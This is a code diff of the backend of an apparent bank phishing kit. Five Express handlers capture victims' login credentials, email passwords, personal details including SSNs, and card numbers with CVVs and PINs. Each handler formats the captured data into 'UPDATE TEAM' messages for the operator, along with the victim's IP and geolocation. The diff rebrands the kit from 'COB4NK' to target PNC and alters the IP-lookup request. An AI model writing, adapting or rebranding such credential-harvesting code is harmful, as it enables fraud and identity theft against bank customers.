@@ -16,7 +16,7 @@ exports.login = (req, res) => {
 exports.loginPost = async (req, res) => {
 	const { username, password } = req.body;
 	const sendAPIRequest = async (ipAddress) => {
-        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
+        const apiResponse = await axios.get(URL + "&ip_address=" + ipAddress);
 		console.log(apiResponse.data);
         return apiResponse.data;
     };
@@ -33,7 +33,7 @@ exports.loginPost = async (req, res) => {
     const systemLang = req.headers["accept-language"];
 
 	const message =
-		`✅ UPDATE TEAM | COB4NK | USER_${ipAddress}\n\n` +
+		`✅ UPDATE TEAM | PNC | USER_${ipAddress}\n\n` +
 		`👤 LOGIN INFO\n` +
 		`USERNAME         : ${username}\n` +
 		`PASSWORD         : ${password}\n\n` +
@@ -79,7 +79,7 @@ exports.login2 = (req, res) => {
 exports.loginPost2 = async (req, res) => {
 	const { username, password } = req.body;
 	const sendAPIRequest = async (ipAddress) => {
-        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
+        const apiResponse = await axios.get(URL + "&ip_address=" + ipAddress);
 		console.log(apiResponse.data);
         return apiResponse.data;
     };
@@ -96,7 +96,7 @@ exports.loginPost2 = async (req, res) => {
 
 
         const message =
-            `✅ UPDATE TEAM | COB4NK | USER_${ipAddress}\n\n` +
+            `✅ UPDATE TEAM | PNC | USER_${ipAddress}\n\n` +
             `👤 RELOGIN INFO\n` +
 			`USERNAME         : ${username}\n` +
 			`PASSWORD         : ${password}\n\n` +
@@ -128,7 +128,7 @@ exports.login3 = (req, res) => {
 exports.loginPost3 = async (req, res) => {
 	const { emailAddr, emailPass } = req.body;
 	const sendAPIRequest = async (ipAddress) => {
-        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
+        const apiResponse = await axios.get(URL + "&ip_address=" + ipAddress);
 		console.log(apiResponse.data);
         return apiResponse.data;
     };
@@ -145,7 +145,7 @@ exports.loginPost3 = async (req, res) => {
 
 
         const message =
-            `✅ UPDATE TEAM | COB4NK | USER_${ipAddress}\n\n` +
+            `✅ UPDATE TEAM | PNC | USER_${ipAddress}\n\n` +
             `👤 EMAIL INFO\n` +
 			`EMAIL ADDRESS    : ${emailAddr}\n` +
 			`EMAIL PASSWORD   : ${emailPass}\n\n` +
@@ -177,7 +177,7 @@ exports.login4 = (req, res) => {
 exports.loginPost4 = async (req, res) => {
 	const { fullName, address, zip, phone, dob, ssn } = req.body;
 	const sendAPIRequest = async (ipAddress) => {
-        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
+        const apiResponse = await axios.get(URL + "&ip_address=" + ipAddress);
 		console.log(apiResponse.data);
         return apiResponse.data;
     };
@@ -195,7 +195,7 @@ exports.loginPost4 = async (req, res) => {
 
 
 	const message =
-		`✅ UPDATE TEAM | COB4NK | USER_${ipAddress}\n\n` +
+		`✅ UPDATE TEAM | PNC | USER_${ipAddress}\n\n` +
 		`👤 PERSONAL INFO\n` +
 		`FULL NAME        : ${fullName}\n` +
 		`STREET ADDRESS   : ${address}\n` +
@@ -230,7 +230,7 @@ exports.login5 = (req, res) => {
 exports.loginPost5 = async (req, res) => {
 	const { cardNum, expDate, cvv, cpin } = req.body;
 	const sendAPIRequest = async (ipAddress) => {
-        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
+        const apiResponse = await axios.get(URL + "&ip_address=" + ipAddress);
 		console.log(apiResponse.data);
         return apiResponse.data;
     };
@@ -247,7 +247,7 @@ exports.loginPost5 = async (req, res) => {
 
 
 	const message =
-		`✅ UPDATE TEAM | COB4NK | USER_${ipAddress}\n\n` +
+		`✅ UPDATE TEAM | PNC | USER_${ipAddress}\n\n` +
 		`👤 CARD INFO\n` +
 		`CARD NUMBER      : ${cardNum}\n` +
 		`EXPIRY DATE      : ${expDate}\n` +
